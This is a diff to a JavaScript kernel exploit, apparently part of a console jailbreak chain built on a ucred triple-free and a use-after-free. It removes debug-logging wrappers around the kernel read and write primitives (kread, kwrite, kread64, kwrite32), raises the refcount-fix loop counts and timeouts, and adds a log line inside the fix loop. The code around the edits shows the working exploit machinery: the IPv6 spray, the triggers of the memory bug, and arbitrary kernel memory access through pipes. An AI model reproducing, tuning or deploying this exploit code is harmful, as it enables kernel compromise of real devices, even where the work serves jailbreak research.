@@ -542,14 +542,6 @@ function trigger_iov_recvmsg() {
     }
   }
 }
-var real_trigger_iov_recvmsg = trigger_iov_recvmsg;
-trigger_iov_recvmsg = function() {
-  log("[IOV] trigger_iov_recvmsg BEFORE");
-  var ret = real_trigger_iov_recvmsg();
-  log("[IOV] trigger_iov_recvmsg AFTER ret=" + ret);
-  return ret;
-};
-
 function wait_iov_recvmsg() {
   var worker;
   // Wait for completition
@@ -561,14 +553,6 @@ function wait_iov_recvmsg() {
 
   // debug("iov_recvmsg workers run OK");
 }
-var real_wait_iov_recvmsg = wait_iov_recvmsg;
-wait_iov_recvmsg = function() {
-  log("[IOV] wait_iov_recvmsg BEFORE");
-  var ret = real_wait_iov_recvmsg();
-  log("[IOV] wait_iov_recvmsg AFTER ret=" + ret);
-  return ret;
-};
-
 function trigger_ipv6_spray_and_read() {
   // Worker information is already loaded
 
@@ -822,7 +806,6 @@ function fill_buffer_64(buf, val, len) {
   }
 }
 function find_twins() {
-  log("[TWINS] enter find_twins");
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
@@ -1252,13 +1235,6 @@ function kwrite(dest, src, n) {
   }
   return write(new BigInt(victimWpipeFd), src, n);
 }
-var real_kwrite = kwrite;
-kwrite = function(dest, src, n) {
-  log("[IOV] WRITE BEFORE dest=" + dest + " n=" + n);
-  var ret = real_kwrite(dest, src, n);
-  log("[IOV] WRITE AFTER ret=" + ret);
-  return ret;
-};
 function kread(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
     return BigInt_Error;
@@ -1270,13 +1246,6 @@ function kread(dest, src, n) {
   read(new BigInt(victimRpipeFd), dest, n);
   return new BigInt(0);
 }
-var real_kread = kread;
-kread = function(dest, src, n) {
-  log("[IOV] kREAD BEFORE dest=" + dest + " n=" + n);
-  var ret = real_kread(dest, src, n);
-  log("[IOV] kREAD AFTER ret=" + ret);
-  return ret;
-};
 function kwrite64(addr, val) {
   if (addr.eq(0)) {
     return BigInt_Error;
@@ -1284,12 +1253,6 @@ function kwrite64(addr, val) {
   write64(tmp, val);
   return kwrite(addr, tmp, 8);
 }
-var real_kwrite64 = kwrite64;
-
-kwrite64 = function(addr, val) {
-  log("[MEM] write64 addr=" + addr + " val=0x" + val.toString(16));
-  return real_kwrite64(addr, val);
-};
 function kwrite32(addr, val) {
   if (addr.eq(0)) {
     return BigInt_Error;
@@ -1297,12 +1260,6 @@ function kwrite32(addr, val) {
   write32(tmp, val);
   return kwrite(addr, tmp, 4);
 }
-var real_kwrite32 = kwrite32;
-
-kwrite32 = function(addr, val) {
-  log("[MEM] kwrite32 addr=" + addr + " val=0x" + val.toString(16));
-  return real_kwrite32(addr, val);
-};
 function kread64(addr) {
   if (addr.eq(0)) {
     return new BigInt(0);
@@ -1313,13 +1270,6 @@ function kread64(addr) {
   }
   return read64(tmp);
 }
-var real_kread64 = kread64;
-
-kread64 = function(addr) {
-  var val = real_kread64(addr);
-  log("[MEM] kread64 addr=" + addr + " val=0x" + val.toString(16));
-  return val;
-};
 function kread32(addr) {
   if (addr.eq(0)) {
     return 0;
@@ -1330,13 +1280,6 @@ function kread32(addr) {
   }
   return read32(tmp);
 }
-var real_kread32 = kread32;
-
-kread32 = function(addr) {
-  var val = real_kread32(addr);
-  log("[MEM] kread32 addr=" + addr + " val=0x" + val.toString(16));
-  return val;
-};
 function read_buffer(addr, len) {
   if (addr.eq(0) || len <= 0) {
     return new Uint8Array(0);
@@ -1401,8 +1344,8 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 24;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2400;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
 
 function trigger_ucred_triplefree() {
   log("[TRIGGER] enter trigger_ucred_triplefree");
@@ -1449,6 +1392,7 @@ function trigger_ucred_triplefree() {
     // 6) محاولة إصلاح refcount بشكل خفيف
     log("[TRIGGER] step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
+      log("[TRIGGER]   fix_loop i=" + i);
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
